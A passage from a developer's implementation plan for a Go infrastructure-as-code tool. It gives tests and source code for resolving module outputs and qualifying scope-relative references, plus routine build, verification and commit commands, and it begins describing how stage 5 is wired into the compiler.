	origin := value.Origin{File: "infra.yml", Line: 1, Column: 1}

	e, ds := expressions.Parse(src, origin)
	if ds.HasErrors() {
		t.Fatalf("fixture expression %q does not parse: %+v", src, ds)
	}
	v, evalDiags := expressions.Evaluate(scope.Qualify(e), scope)
	ds.Extend(evalDiags)
	return v, ds
}

func TestBareNameInsideAModuleResolvesToTheQualifiedAddress(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": "project: demo\nmodules:\n  - ./net\nresources:\n  netA:\n    type: module.net\n",
		"net/module.yml": `
resources:
  db:
    type: test.thing
  web:
    type: test.thing
`,
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	v, ds := evalAt(t, exp, "web", "${db.endpoint}")
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	// THE Ruling 1 landmine. A bare `db` inside a module must not resolve to a
	// root `db`, nor to another module's.
	if got := v.Expr.Ref.Target.String(); got != "module.netA.db" {
		t.Errorf("reference target = %q, want %q — a bare name inside a module names THAT "+
			"module's resource", got, "module.netA.db")
	}
}

func TestBareNameResolvesToAModuleCallsOutput(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./db
resources:
  web:
    type: test.thing
  database:
    type: module.db
`,
		"db/module.yml": `
resources:
  server:
    type: test.thing
outputs:
  connection_string:
    value: ${server.endpoint}
`,
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	v, ds := evalAt(t, exp, "web", "${database.connection_string}")
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	if v.Known {
		t.Fatal("an output reading a resource attribute is unknown at plan time (Ruling 5)")
	}
	// The edge must land on the real resource inside the module, because that
	// is what has to exist before the value becomes knowable.
	if got := v.Expr.Ref.Target.String(); got != "module.database.server" {
		t.Errorf("reference target = %q, want %q", got, "module.database.server")
	}
}

// Ruling 5's explicit requirement: never an empty string.
func TestUnknownModuleOutputNeverRendersAsAnEmptyString(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./db
resources:
  web:
    type: test.thing
  database:
    type: module.db
`,
		"db/module.yml": `
resources:
  server:
    type: test.thing
outputs:
  connection_string:
    value: ${server.endpoint}
`,
	})

	exp, _ := Expand(decl, variables.Scope{}, dir, paths{})
	v, ds := evalAt(t, exp, "web", "postgres://${database.connection_string}/app")
	if ds.HasErrors() {
		t.Fatalf("an unknown output must not be a coercion failure: %+v", ds)
	}
	if v.Known {
		t.Fatal("unknownness is contagious: a string built from an unknown output is unknown")
	}
	rendered := value.Format(v, value.ProseFormatOptions)
	if rendered == "" || rendered == "postgres:///app" {
		t.Fatalf("rendered as %q; an unknown output must render as the renderer's unknown "+
			"text, never as an empty string spliced into a plan", rendered)
	}
}

func TestKnownModuleOutputFoldsToALiteralFromTheModule(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./db
resources:
  web:
    type: test.thing
  database:
    type: module.db
    region: eu-west-1
`,
		"db/module.yml": `
inputs:
  region:
    type: string
resources:
  server:
    type: test.thing
outputs:
  home:
    value: ${region}
`,
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	v, ds := evalAt(t, exp, "web", "${database.home}")
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	if s, _ := v.AsString(); s != "eu-west-1" {
		t.Errorf("output = %v, want eu-west-1", v.Raw)
	}
	if v.Source != value.SourceModule {
		t.Errorf("source = %v, want SourceModule — at the call site the honest answer to "+
			"\"what kind of thing is this\" is that it came out of a module", v.Source)
	}
}

// Amendment 11: Qualify reports nothing and supplies candidates. These pin the
// DATA the general check builds its message from; Task 8 asserts the message.
func TestQualifyLeavesAnUnresolvableReferenceForTheGeneralCheck(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./db
resources:
  web:
    type: test.thing
  database:
    type: module.db
`,
		// Three outputs, declared so that NO natural order produces the sorted
		// one: `zone` is first in the file and last alphabetically, `host` is
		// last in the file and in the middle. A single-output fixture — or one
		// already in order — passes against an implementation that never sorts,
		// and it looks tidier, which is why it has to be said rather than left
		// to care.
		"db/module.yml": `
resources:
  server:
    type: test.thing
outputs:
  zone:
    value: a
  alpha:
    value: b
  host:
    value: fixed
`,
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	scope := scopeOf(t, exp, "web")

	// A name bound to nothing: the node comes back untouched, so stage 6 sees a
	// reference it can report on with the candidate list below.
	e, _ := expressions.Parse("${databse.host}", value.Origin{File: "infra.yml", Line: 1})
	if got := scope.Qualify(e); got != e {
		t.Errorf("Qualify rewrote an unresolvable reference (%v); it must leave it exactly as "+
			"it stands so ONE check reports it", got)
	}

	names := scope.Names()
	if strings.Join(names, ",") != "database,web" {
		t.Errorf("Names() = %v, want [database web] sorted — this is the candidate list the "+
			"general check prints, and Ruling 4 requires it to include BOTH a mistyped "+
			"resource and a mistyped module call", names)
	}

	// A module call whose output does not exist: same treatment, different
	// candidate source.
	e2, _ := expressions.Parse("${database.hsot}", value.Origin{File: "infra.yml", Line: 2})
	if got := scope.Qualify(e2); got != e2 {
		t.Errorf("Qualify rewrote a reference to a nonexistent output (%v)", got)
	}
	outs, ok := scope.OutputNames("database")
	if !ok {
		t.Fatal("OutputNames must answer for a module call — it is the module arm of the " +
			"attribute-existence check (Amendment 13c)")
	}
	if strings.Join(outs, ",") != "alpha,host,zone" {
		t.Errorf("OutputNames(database) = %v, want [alpha host zone] SORTED. It is read from a "+
			"map, so without the sort this list reorders between identical runs — and it "+
			"feeds a diagnostic telling the user what they could have written instead, "+
			"which is a user-visible defect no other test would notice", outs)
	}
	if _, ok := scope.OutputNames("web"); ok {
		t.Error("OutputNames must report false for a plain resource; its attributes come from " +
			"its schema, which is the other arm of the same check")
	}
}

// PLAN.md §11's own spelling of an output, which is a literal string in this
// language (Amendment 4).
func TestBareOutputValueThatLooksLikeAReferenceWarns(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": "project: demo\nmodules:\n  - ./db\nresources:\n  d:\n    type: module.db\n",
		"db/module.yml": `
resources:
  service:
    type: test.thing
outputs:
  endpoint:
    value: service.endpoint
`,
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("a literal output is legal, not an error: %+v", ds)
	}
	if !hasFragment(ds, "did you mean ${service.endpoint}") {
		t.Errorf("a bare value naming something in scope is almost certainly a missing ${}; "+
			"got %+v", ds)
	}
}

// The false positive the filter has to survive: a hostname whose first segment
// happens to name a resource in the same module. A one-dot check alone would
// warn here, and a warning on legitimate configuration is what makes users stop
// reading warnings.
func TestDottedLiteralOutputDoesNotWarnEvenWhenItsFirstSegmentIsBound(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": "project: demo\nmodules:\n  - ./m\nresources:\n  d:\n    type: module.m\n",
		"m/module.yml": `
resources:
  db:
    type: test.thing
outputs:
  host:
    value: db.example.com
`,
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if len(ds) != 0 {
		t.Errorf("`db.example.com` is a hostname, not a missing ${}; got %+v", ds)
	}
}

// PLAN.md §11's flagship example. `application` sorts BEFORE `database`, so name
// order expands it first and its attribute reads an output that does not exist
// yet. The fixture's names contradict the required order on purpose.
func TestSiblingCallsAreExpandedInDependencyOrderNotNameOrder(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./app
  - ./db
resources:
  application:
    type: module.app
    database_url: ${database.connection_string}
  database:
    type: module.db
`,
		"app/module.yml": `
inputs:
  database_url:
    type: string
resources:
  server:
    type: test.thing
`,
		"db/module.yml": `
resources:
  pg:
    type: test.thing
outputs:
  connection_string:
    value: ${pg.endpoint}
`,
	})

	exp, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("PLAN.md §11's own example must compile: %+v", ds)
	}

	v, ok := scopeOf(t, exp, "server").Variable("database_url")
	if !ok {
		t.Fatal("database_url is not in the application module's scope")
	}
	if v.Known {
		t.Fatal("it reads an output that reads a resource attribute; it is unknown at plan time")
	}
	if got := v.Expr.Ref.Target.String(); got != "module.database.pg" {
		t.Errorf("database_url defers to %q, want %q — name order would have expanded "+
			"`application` first and resolved this against nothing", got, "module.database.pg")
	}
}

func TestSiblingCallsReferencingEachOtherAreRefused(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
modules:
  - ./m
resources:
  a:
    type: module.m
    text: ${b.out}
  b:
    type: module.m
    text: ${a.out}
`,
		"m/module.yml": `
inputs:
  text:
    type: string
resources:
  thing:
    type: test.thing
outputs:
  out:
    value: ${text}
`,
	})

	_, ds := Expand(decl, variables.Scope{}, dir, paths{})
	if !hasFragment(ds, "module calls reference each other in a cycle") {
		t.Errorf("two siblings each reading the other's output have no valid order; got %+v", ds)
	}
	if !hasFragment(ds, "a -> b -> a") {
		t.Errorf("the diagnostic must show the cycle, not merely assert one (§7.4); got %+v", ds)
	}
	for _, s := range summaries(ds) {
		if strings.Contains(s, "never terminates") {
			t.Fatalf("reported as a SOURCE cycle (%q); these siblings terminate fine and simply "+
				"have no valid order — two different failures", s)
		}
	}
}

// Ruling 5's Coerce case, by Amendment 2's chain: an unknown INTEGER leaves
// module a as an output and enters module b's input, declared `type: float`.
//
// `count` is supplied from a root variable that is declared but unset rather
// than left unsupplied, so the fixture produces NO diagnostics: an unsupplied
// defaultless input is a diagnostic in its own right (Task 5), and a fixture
// carrying an unrelated error is one whose real assertion nobody can trust.
func TestUnknownIntegerOutputCoercesToAFloatInputAndStaysUnknown(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
variables:
  scale:
    type: integer
modules:
  - ./a
  - ./b
resources:
  ca:
    type: module.a
    count: ${scale}
  cb:
    type: module.b
    ratio: ${ca.n}
`,
		"a/module.yml": `
inputs:
  count:
    type: integer
resources:
  thing:
    type: test.thing
outputs:
  n:
    value: ${count}
`,
		"b/module.yml": `
inputs:
  ratio:
    type: float
resources:
  worker:
    type: test.thing
`,
	})

	// What `infra validate` hands stage 5: an environment-scoped variable with
	// no environment selected resolves to an unknown of its DECLARED kind
	// (internal/variables/resolve.go:327).
	var vars variables.Scope
	vars.Override("scale", value.Unknown(value.KindInt, value.SourceVariable))

	exp, ds := Expand(decl, vars, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("an unknown integer is exact to retype as a float — there is no datum to "+
			"round: %+v", ds)
	}

	got, ok := scopeOf(t, exp, "worker").Variable("ratio")
	if !ok {
		t.Fatal("ratio is not in module b's scope")
	}
	if got.Known {
		t.Fatal("it must still be unknown; Coerce retypes the claim, it does not invent a datum")
	}
	if got.Kind != value.KindFloat {
		t.Errorf("ratio kind = %v, want KindFloat — this is value.Coerce's unknown branch, "+
			"added in M4 as dead code with a comment saying it goes live in M5", got.Kind)
	}
	if got.Raw != nil {
		t.Error("Value's contract is that Raw is nil when Known is false")
	}
}

// The half of the chain the uniform OpLiteral fold buys. An Expr-splice would
// lose the Kind here and the test above would report a type mismatch instead of
// reaching Coerce.
func TestAnUnknownOutputKeepsItsKindAcrossTheModuleBoundary(t *testing.T) {
	decl, dir := fixture(t, map[string]string{
		"infra.yml": `
project: demo
variables:
  scale:
    type: integer
modules:
  - ./a
resources:
  web:
    type: test.thing
  ca:
    type: module.a
    count: ${scale}
`,
		"a/module.yml": `
inputs:
  count:
    type: integer
resources:
  thing:
    type: test.thing
outputs:
  n:
    value: ${count}
`,
	})

	var vars variables.Scope
	vars.Override("scale", value.Unknown(value.KindInt, value.SourceVariable))

	exp, ds := Expand(decl, vars, dir, paths{})
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	v, ds := evalAt(t, exp, "web", "${ca.n}")
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}
	if v.Kind != value.KindInt {
		t.Errorf("kind = %v, want KindInt — an unknown output must cross the boundary carrying "+
			"the kind it had inside the module; the evaluator re-derives an unresolved "+
			"reference as KindString, which is why Qualify folds a VALUE and not an Expr", v.Kind)
	}
}
```

#### 7.2 Run them, see them fail

```bash
go test -count=1 ./internal/modules/
```

Expect `scope.Qualify undefined`, and the sibling-ordering tests failing because
`database` is expanded after `application`.

> **Why Ruling 5's route needs BOTH Task 5's Amendment-2 stamping and this task's uniform
> fold.** `internal/expressions/eval.go` types every unresolved `OpResourceRef` as
> `KindString`, so nothing derived from a resource attribute can be the numeric side of
> `value.Coerce`'s unknown branch. The only producer of an unknown already claiming
> `KindInt` or `KindFloat` is a DECLARED kind stamped onto an unset value —
> `internal/variables/resolve.go:327` for a variable, Task 5 for a module input. That kind
> then has to survive crossing a module boundary, which is what the `OpLiteral` fold buys.
> Both halves are tested, separately, so a regression in the fold is not misread as a
> regression in `Coerce`.

#### 7.3 Bindings, outputs and qualification

Create `internal/modules/outputs.go`:

```go
package modules

import (
	"sort"
	"strconv"
	"strings"

	"github.com/infrata/infrata/internal/config"
	"github.com/infrata/infrata/internal/diag"
	"github.com/infrata/infrata/internal/expressions"
	"github.com/infrata/infrata/internal/graph"
	"github.com/infrata/infrata/pkg/address"
	"github.com/infrata/infrata/pkg/value"
)

// BindingKind says which of the two things a bare name in ${name.attr} refers
// to. The parser has no scope and must not guess, so this is decided here,
// where both the resources and the module calls at a level are in hand.
type BindingKind uint8

const (
	// BindsNothing is the zero value: the name is not in scope.
	BindsNothing BindingKind = iota
	// BindsResource: ${name.attr} reads a resource's attribute.
	BindsResource
	// BindsModule: ${name.attr} reads a module call's output.
	BindsModule
)

// Binding is what one bare name refers to at one level.
type Binding struct {
	Kind BindingKind
	// Address is the qualified resource, when Kind is BindsResource.
	Address address.Address
	// Addresses is everything the call produced, when Kind is BindsModule.
	// Nothing is addressed with the call's own name after expansion, so this is
	// how an edge naming it is resolved.
	Addresses []address.Address
	// Outputs are the call's collected outputs keyed by name, when Kind is
	// BindsModule. A value here is routinely unknown (Ruling 5).
	Outputs map[string]value.Value
}

// Lookup reports what a bare name binds to at this level.
func (s *Scope) Lookup(name string) (Binding, bool) {
	b, ok := s.names[name]
	return b, ok
}

// Names lists every bound name, sorted, for diagnostics that say what IS in
// scope. Go's map iteration is randomised and such a list must not reorder
// itself between runs of the same configuration.
func (s *Scope) Names() []string {
	out := make([]string, 0, len(s.names))
	for name := range s.names {
		out = append(out, name)
	}
	sort.Strings(out)
	if len(out) == 0 {
		return []string{"(nothing)"}
	}
	return out
}

func (s *Scope) bind(name string, b Binding) {
	if s.names == nil {
		s.names = map[string]Binding{}
	}
	s.names[name] = b
}

// Qualify rewrites every resource reference in e against the names in scope at
// this level. Compiler stage 6 calls it between expressions.Parse and
// expressions.Evaluate (Amendment 7).
//
// A name bound to a RESOURCE has its reference target replaced by the
// resource's qualified address. Without this, `${db.id}` written inside two
// different modules parses to the same reference and resolves to whichever `db`
// the engine looked at first — Ruling 1's silently wrong plan, now with a
// module field that nothing fills so the bug looks handled.
//
// A name bound to a MODULE CALL has its whole node replaced by an OpLiteral
// holding the output's VALUE. Folding here rather than resolving at evaluation
// time is what puts the dependency edge on the real resource inside the module,
// which has to exist before the value becomes knowable. Resolving it in
// Scope.Attribute instead cannot work — the evaluator passes Attribute the
// parsed, BARE reference, so the deferred expression would keep a target naming
// nothing.
//
// IT EMITS NO DIAGNOSTICS, and returns one value — Amendment 7's own spelling,
// `e = inst.Scope.Qualify(e)`. A reference it cannot resolve (a name bound to
// nothing, or a module output that does not exist) is left EXACTLY as it stands
// for stage 6's general attribute-existence check to report (Amendment 11).
// Qualify supplies that check its candidates through Names() and OutputNames();
// it does not build a second message of its own.
//
// A NEW tree is returned and e is never modified: the source AST is shared by
// every value that references it, and internal/expressions' residual relies on
// that.
func (s *Scope) Qualify(e *value.Expr) *value.Expr {
	if e == nil {
		return nil
	}
	if e.Op != value.OpResourceRef {
		if len(e.Args) == 0 {
			return e
		}
		out := *e
		out.Args = make([]*value.Expr, len(e.Args))
		for i, a := range e.Args {
			out.Args[i] = s.Qualify(a)
		}
		return &out
	}

	b, ok := s.names[e.Ref.Target.Name]
	if !ok {
		// Bound to nothing. Left as it stands; stage 6 reports it with Names()
		// as the candidate list, so Ruling 4's "no resource or module named X"
		// wording comes from the one place that wording lives.
		return e
	}

	switch b.Kind {
	case BindsResource:
		out := *e
		out.Ref = value.Reference{Target: b.Address, Attribute: e.Ref.Attribute}
		return &out

	case BindsModule:
		v, declared := b.Outputs[e.Ref.Attribute]
		if !declared {
			// The module arm of attribute-existence. Left unresolved for the
			// same check that catches `${store.endpoint}` on a provider
			// resource with no `endpoint` — one mechanism, rather than two
			// messages for one mistake.
			return e
		}
		// ONE branch for known and unknown alike. Splicing v.Expr for an
		// unknown loses the Kind — eval.go re-derives an unresolved reference
		// as KindString — and Amendment 2's chain then reports a type mismatch
		// instead of reaching value.Coerce's unknown branch. An OpLiteral loses
		// nothing: evaluate()'s OpLiteral case returns e.Literal verbatim, so
		// Known, Kind, Sensitive and the value's own Expr all survive, and the
		// dependency edge survives with them.
		//
		// Sensitivity rides along deliberately. Dropping it would launder a
		// secret into a plan artifact — value.Expr.String redacts a sensitive
		// literal for exactly this reason, so folding is never a second
		// redaction path.
		return &value.Expr{
			Op:      value.OpLiteral,
			Literal: v.WithSource(value.SourceModule).WithOrigin(e.Origin),
			Origin:  e.Origin,
		}

	default:
		return e
	}
}

// OutputNames reports the outputs a module instance exposes, sorted, and false
// when name is not a module instance at this level.
//
// This is the module arm of ONE attribute-existence check (Amendment 11).
// Nothing validates today that a referenced ATTRIBUTE exists on its target —
// bind.go:148 checks only that the resource is declared — so `${store.endpoint}`
// on a `test.network` with no `endpoint` passes `validate`, produces a clean
// plan, and fails halfway through `apply` after creating real infrastructure.
// Task 8 closes that generally. A provider resource answers from its schema, a
// module instance answers from here, and the user reads the same sentence
// either way.
//
// A module-only diagnostic here instead would be a module-only implementation
// of a check the compiler performs generally — the same shape Amendment 8
// removed from the input-provenance code, where Amendment 5b's rung logic
// reimplemented for modules what bindAttribute already did for everything.
// Removing that in one amendment and reintroducing it in the next is not a
// trade worth making.
func (s *Scope) OutputNames(name string) ([]string, bool) {
	b, ok := s.names[name]
	if !ok || b.Kind != BindsModule {
		return nil, false
	}
	return sortedValueKeys(b.Outputs), true
}

// collectOutputs evaluates a module's `outputs:` block in the MODULE's own
// scope. An output is an expression over the module's resources, so at plan
// time it is routinely unknown (Ruling 5) — not an error, and never an empty
// string.
func (w *walker) collectOutputs(lv level, scope *Scope) map[string]value.Value {
	out := make(map[string]value.Value, len(lv.Outputs))
	// lv.Outputs is sorted by name (stage 2), so several bad outputs report in a
	// stable order with no sort here.
	for _, o := range lv.Outputs {
		out[o.Name] = w.collectOutput(o, scope)
	}
	return out
}

func (w *walker) collectOutput(o config.OutputDecl, scope *Scope) value.Value {
	if !o.HasExpressions {
		w.warnBareReference(o, scope)
		// A literal output is legal: `outputs: {region: {value: us-east-1}}`.
		return o.Value.WithSource(value.SourceModule)
	}

	src, ok := o.Value.AsString()
	if !ok {
		w.ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "interpolation inside a " + o.Value.Kind.String() + " is not supported",
			Detail:   "Expressions may appear in string values only.",
			Origin:   o.Origin,
		})
		return o.Value
	}

	e, parseDiags := expressions.Parse(src, o.Origin)
	w.ds.Extend(parseDiags)
	if parseDiags.HasErrors() {
		return o.Value
	}
	v, evalDiags := expressions.Evaluate(scope.Qualify(e), scope)
	w.ds.Extend(evalDiags)

	// SourceModule says what KIND of thing this is at the call site: a value
	// that came out of a module.
	return v.WithSource(value.SourceModule)
}

// warnBareReference catches PLAN.md §11's own spelling of an output —
// `value: service.endpoint`, with no ${} — which in this language is the
// literal string "service.endpoint" (Amendment 4).
//
// A warning rather than an error, because a literal output is legal and useful.
// The filter is narrow on purpose: exactly one dot, a first segment that is
// actually bound, and nothing that reads as data. `db.example.com` has two dots
// and does not warn even in a module that declares a resource called `db`;
// `1.2.3` has two; a URL or a path has a character from the set. The only shape
// that survives is the one the spec prints.
func (w *walker) warnBareReference(o config.OutputDecl, scope *Scope) {
	s, ok := o.Value.AsString()
	if !ok {
		return
	}
	name, attr, found := strings.Cut(s, ".")
	if !found || name == "" || attr == "" ||
		strings.Contains(attr, ".") || strings.ContainsAny(s, " /:$") {
		return
	}
	if _, bound := scope.Lookup(name); !bound {
		return
	}
	w.ds.Add(diag.Diagnostic{
		Severity: diag.SeverityWarning,
		Summary:  "output " + strconv.Quote(o.Name) + " is the literal string " + strconv.Quote(s),
		Detail: strconv.Quote(name) + " is a resource or module call in " + where(scope.Module) +
			", so this looks like a reference written without its interpolation.",
		Action: "Write `value: ${" + s + "}` if you meant the reference — did you mean ${" + s +
			"}? Otherwise quote it to say you meant the text.",
		Origin: o.Origin,
	})
}

// sortedValueKeys lists a value map's keys for a diagnostic.
func sortedValueKeys(m map[string]value.Value) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	sort.Strings(out)
	if len(out) == 0 {
		return []string{"(none)"}
	}
	return out
}

// parseCall parses each of a module call's attributes ONCE. The ordering pass
// reads the references; the evaluation reads the trees. Parsing twice would
// report every syntax error twice.
func (w *walker) parseCall(r *config.ResourceDecl) map[string]*value.Expr {
	out := map[string]*value.Expr{}
	for _, name := range sortedAttributeNames(r.Attributes) {
		attr := r.Attributes[name]
		if !attr.HasExpressions {
			continue
		}
		src, ok := attr.Value.AsString()
		if !ok {
			// The same refusal bind.go makes for a composite carrying an
			// interpolation: the language interpolates strings, not structures,
			// and passing the composite through would put raw "${…}" text into
			// a plan as though it were a literal.
			w.ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  "interpolation inside a " + attr.Value.Kind.String() + " is not supported",
				Detail:   "Expressions may appear in string values only.",
				Origin:   attr.Origin,
			})
			continue
		}
		e, parseDiags := expressions.Parse(src, attr.Origin)
		w.ds.Extend(parseDiags)
		if parseDiags.HasErrors() {
			continue
		}
		out[name] = e
	}
	return out
}

// callNode is one sibling module call, for the ordering graph.
type callNode struct{ name string }

func (n callNode) ID() string { return n.name }

// orderCalls returns one level's module calls in an order where every call a
// sibling's attributes read has already been expanded.
//
// PLAN.md §11's own example needs this: an `application` call takes
// ${database.connection_string} and sorts BEFORE `database`, so name order would
// resolve its attribute against a call that does not exist yet.
//
// graph.Layers sorts each layer by ID, so the result is identical on every run
// and degenerates to name order when no call references another — invariant 6
// holds with no sort of our own.
func (w *walker) orderCalls(
	lv level, exprs map[string]map[string]*value.Expr, module []string,
) []*config.ResourceDecl {
	byName := map[string]*config.ResourceDecl{}
	g := graph.New[callNode]()
	// Every node is added BEFORE any edge: graph.Edge panics on an endpoint it
	// has not seen, and its doc comment says so.
	for _, r := range lv.Resources {
		if !strings.HasPrefix(r.Type, TypePrefix) {
			continue
		}
		byName[r.Name] = r
		g.Add(callNode{name: r.Name})
	}

	for name, r := range byName {
		for _, byAttr := range exprs[name] {
			for _, ref := range byAttr.References() {
				target := ref.Target.Name
				if target == r.Name {
					continue // self-reference; the cycle below reports it
				}
				if _, sibling := byName[target]; sibling {
					g.Edge(target, r.Name) // target must be expanded first
				}
			}
		}
	}

	layers, err := g.Layers()
	if err != nil {
		cycle := g.Cycle()
		full := append(append([]string(nil), cycle...), cycle[0])
		w.ds.Add(diag.Diagnostic{
			Severity: diag.SeverityError,
			Summary:  "module calls reference each other in a cycle",
			Detail: strings.Join(full, " -> ") + "\n\nEach call's attributes read an output of " +
				"the next, in " + where(module) + ", so there is no order in which they can be " +
				"expanded.\n\nThis is not a `modules:` cycle: these calls terminate, they simply " +
				"have no valid order.",
			Action: "Remove one of the references, or move the shared value into a variable both " +
				"can read.",
			Origin: byName[cycle[0]].Origin,
		})
		return nil
	}

	out := make([]*config.ResourceDecl, 0, len(byName))
	for _, layer := range layers {
		for _, n := range layer {
			out = append(out, byName[n.name])
		}
	}
	return out
}
```

Iterating `byName` (a map) to add edges is safe: `graph.Edge` is idempotent and
`graph.Layers` sorts each layer by ID, so the edge set — and therefore the order — does
not depend on insertion order. This is the one place a map iteration is deliberate rather
than an oversight; say so in a comment if you prefer, but do not add a sort that
`Layers` would only redo.

#### 7.4 Bind names and collect outputs in the walk

`expand` binds the level's plain resources first, orders the calls, then binds each
call's outputs as it finishes:

```go
func (w *walker) expand(lv level, scope *Scope, dir string, module []string) []address.Address {
	loaded := w.loadModules(lv, dir, module)

	var produced []address.Address
	calls := map[string][]address.Address{}

	for _, r := range lv.Resources {
		if strings.HasPrefix(r.Type, TypePrefix) {
			continue
		}
		addr := addressIn(module, r.Name)
		w.instances = append(w.instances, Instance{
			Address: addr,
			Decl:    instantiateDecl(r, module),
			Scope:   scope,
		})
		produced = append(produced, addr)
		// Bound before any call is expanded, because a call's attributes may
		// read a sibling RESOURCE and resources need no ordering pass — they
		// are not expanded, only named.
		scope.bind(r.Name, Binding{Kind: BindsResource, Address: addr})
	}

	exprs := map[string]map[string]*value.Expr{}
	for _, r := range lv.Resources {
		if strings.HasPrefix(r.Type, TypePrefix) {
			exprs[r.Name] = w.parseCall(r)
		}
	}

	for _, r := range w.orderCalls(lv, exprs, module) {
		supplied := w.evaluateCall(r, scope, exprs[r.Name])
		inner, outputs := w.instantiate(r, loaded, scope, supplied, dir, module)
		calls[r.Name] = inner
		produced = append(produced, inner...)
		// Bound AFTER expansion, because the outputs do not exist until then.
		// That is exactly why orderCalls exists.
		scope.bind(r.Name, Binding{Kind: BindsModule, Addresses: inner, Outputs: outputs})
	}

	w.fanOut(lv, calls, module)
	return produced
}
```

`instantiate` gains `supplied` and returns the outputs alongside the addresses. Every
early return becomes `return nil, nil`, and the tail becomes:

```go
	childLevel := moduleLevel(child)
	innerScope := w.moduleScope(r, childLevel, caller, supplied, inner)
	addrs := w.expand(childLevel, innerScope, lm.Dir, inner)
	// Collected AFTER expanding, so the module's own names are all bound and an
	// output reading ${service.endpoint} resolves to module.<call>.service.
	return addrs, w.collectOutputs(childLevel, innerScope)
```

Add `names map[string]Binding` to `Scope` in `inputs.go`, unexported: it is filled only
while expanding, by `bind`, and read through `Lookup`, `Names` and `Qualify`.

#### 7.5 Run them, see them pass

```bash
go test -count=1 ./internal/modules/
```

#### 7.6 Verify each ruling is actually pinned

```bash
# 1. In Qualify's BindsResource case, return `e` unchanged.
#    TestBareNameInsideAModuleResolvesToTheQualifiedAddress fails.
# 2. In Qualify's BindsModule case, return `e` instead of folding.
#    TestBareNameResolvesToAModuleCallsOutput fails.
# 3. In the BindsModule case, return v.Expr when !v.Known instead of folding the
#    value. TestAnUnknownOutputKeepsItsKindAcrossTheModuleBoundary fails, and so
#    does the Coerce test.
# 4. Make OutputNames return (nil, true) for a module call.
#    TestQualifyLeavesAnUnresolvableReferenceForTheGeneralCheck fails. Also make
#    Qualify rewrite an unbound reference rather than returning it: the same
#    test fails on its first assertion.
# 5. Replace orderCalls' body with a name-ordered slice. Both sibling tests fail.
# 6. Skip the Coerce call in moduleScope. The Coerce test fails.
# 7. In collectOutput, return o.Value without WithSource.
#    TestKnownModuleOutputFoldsToALiteralFromTheModule fails.
# Restore each.
```

#### 7.7 Confirm the containment rules still hold

```bash
# Ruling 2: no YAML outside internal/config. Must print nothing.
grep -rn "yaml\." --include=*.go internal/ pkg/ cmd/ | grep -v "^internal/config/"

# internal/graph still imports no other infra package (this task imports graph,
# not the other way round). Must print only internal/graph itself.
go list -deps ./internal/graph | grep infrata

# Still exactly two third-party dependencies.
grep -c "^	" go.mod
```

#### 7.8 Commit

```bash
go test -count=1 ./... && go vet ./... && gofmt -l .
git add internal/modules/outputs.go internal/modules/outputs_test.go \
  internal/modules/inputs.go internal/modules/expand.go
git commit -m "M5 task 7: module outputs, and scope-relative references qualified at stage 6" -- \
  internal/modules/outputs.go internal/modules/outputs_test.go \
  internal/modules/inputs.go internal/modules/expand.go
```

---

## Task 8 — wire stage 5 into `Compile`

### Why this task exists

Stage 5 is a pure function until something calls it. Where it is called from is not a
detail: it is the only thing that decides what a module's inputs may refer to and what
a reference may refer to.

Stage 5 sits **between stage 4 and stage 6**, and both boundaries are load-bearing:

- **After stage 4.** A module's `inputs:` are evaluated in the caller's scope, and the
  caller's scope includes variables. `inputs: { size: ${replicas} }` is only
  resolvable once `variables.Resolve` has run. Move stage 5 above stage 4 and every
  such input is an undefined variable.
- **Before stage 6.** Binding resolves references between resources, and a module's
  resources do not exist until expansion has instantiated them. Move stage 5 below
  stage 6 and `${database.endpoint}` at the root — a reference to a module output — is
  a reference to a resource that does not exist. Worse, stage 8's requirement checking
  (`internal/compiler/validate.go`) would not see a module's `test.database` at all and
  would report a `test.application` as missing its database.

`internal/compiler/compile.go` already halts at every stage boundary where
`HasErrors()` is true, and its doc comment already writes down the reasoning for each
halt. Adding a stage without adding that paragraph leaves the file's most careful
comment silently incomplete.

**M4 learned that such a halt is not a no-op.** The stage-3 halt was described by its
author as suppressing nothing but noise; it in fact suppresses stage 4's
chain-INDEPENDENT checking, and the doc comment in `compile.go` today spends a
paragraph saying so because a reviewer found it after the author had concluded it was
untestable. **This task states what its halt suppresses and pins it with a test.**

### What the stage-5 halt suppresses

